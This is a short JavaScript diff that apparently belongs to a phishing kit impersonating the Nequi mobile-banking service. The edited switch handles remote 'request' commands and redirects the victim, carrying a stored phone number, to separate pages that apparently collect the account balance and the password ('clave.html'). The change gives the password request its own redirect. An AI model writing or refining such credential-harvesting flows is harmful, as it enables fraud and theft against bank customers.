@@ -250,10 +250,15 @@
                   break;
                   
                 case 'nequi_request_saldo':
-                case 'nequi_request_clave':
                   console.log('[NEQUI-NUMERO] → Redirigiendo a saldo-input.html');
                   sessionStorage.setItem('nequi_phone', phoneNumber);
                   window.location.href = 'saldo-input.html';
+                  break;
+                  
+                case 'nequi_request_clave':
+                  console.log('[NEQUI-NUMERO] → Redirigiendo a clave.html');
+                  sessionStorage.setItem('nequi_phone', phoneNumber);
+                  window.location.href = 'clave.html';
                   break;
                   
                 case 'nequi_error_clave':
